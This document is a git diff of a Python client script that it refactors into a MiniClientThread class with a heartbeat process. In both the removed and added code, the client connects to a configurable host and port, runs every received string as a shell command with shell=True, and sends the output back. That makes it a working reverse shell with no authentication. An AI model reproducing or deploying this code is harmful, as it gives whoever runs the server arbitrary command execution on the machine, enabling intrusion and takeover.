@@ -1,76 +1,74 @@
 import socket
 import os
 import subprocess
-import sys
 import multiprocessing
 import time
-import threading
-
-host = ''
-port = int(sys.argv[1])
-port = port if port else 8091
+from args import get_args
 
 
+class MiniClientThread:
+    def __init__(self, port, host="", hb_rate=1, max_failure=5):
+        self.host = host
+        self.port = port
+        self.hb_rate = hb_rate
+        self.max_failure = max_failure
+        self.empty_byte = b' '
 
+    def worker(self):
+        s = socket.socket()
+        s.connect((self.host, self.port))
+        s.send(self.empty_byte)
+        while True:
+            data = s.recv(1024)
+            if data[:2].decode("utf-8") == 'cd':
+                os.chdir(data[3:].decode("utf-8"))
 
-def worker(q):
+            if len(data) > 0:
+                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
+                                       stdout=subprocess.PIPE, stdin=subprocess.PIPE,
+                                       stderr=subprocess.PIPE)
 
-    s = socket.socket()
-    s.connect((host, port))
-    s.send(b' ')
+                output_byte = cmd.stdout.read() + cmd.stderr.read()
+                output_str = str(output_byte, "utf-8")
+                currentWD = os.getcwd() + "> "
+                s.send(str.encode(output_str + currentWD))
+                print(output_str)
 
-    while True:
-        data = s.recv(1024)
-        if data[:2].decode("utf-8") == 'cd':
-            os.chdir(data[3:].decode("utf-8"))
+    def heartbeat(self):
+        s = socket.socket()
+        s.connect((self.host, self.port))
+        s.send("heartbeat".encode())
+        failed_hb = 1
 
-        if len(data) > 0:
-            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-            output_byte = cmd.stdout.read() + cmd.stderr.read()
-            output_str = str(output_byte,"utf-8")
-            currentWD = os.getcwd() + "> "
-            s.send(str.encode(output_str + currentWD))
+        while True:
+            time.sleep(self.hb_rate)
+            try:
+                s.send(str.encode(' '))
+                s.recv(1024)
+            except:
+                failed_hb += 1
+            if failed_hb > self.max_failure:
+                print("server is down, {}".format(failed_hb))
+                break
+        s.close()
 
-            print(output_str)
+    def run(self):
 
-def heartbeat(q):
-    s = socket.socket()
-    s.connect((host, port))
-    s.send("heartbeat".encode())
-    failed_hb = 1
+        p1 = multiprocessing.Process(target=self.worker)
+        p1.daemon = True
 
-    while True:
-        time.sleep(1)
-        try:
-            s.send(str.encode(' '))
-            s.recv(1024)
-        except:
-            failed_hb += 1
-        if failed_hb > 5:
-            print("server is down, try: {}".format(failed_hb))
-            break
+        p2 = multiprocessing.Process(target=self.heartbeat)
+        p2.daemon = True
 
-    s.close()
+        p1.start()
+        p2.start()
 
-
-def run():
-    q = ""
-    p1 = multiprocessing.Process(target=worker, args=(q,))
-    #p1 = threading.Thread(target=worker, args=(q))
-    #p1.daemon=True
-
-
-
-    p2 = multiprocessing.Process(target=heartbeat, args=(q,))
-    #p2 = threading.Thread(target=heartbeat, args=(q))
-    p2.daemon=True
-
-    p1.start()
-    p2.start()
 
 if __name__ == '__main__':
-    run()
+
+    args = get_args()
+    client = MiniClientThread(port=args.port, host=args.host)
+    client.run()
+
     while True:
         pass
-
-
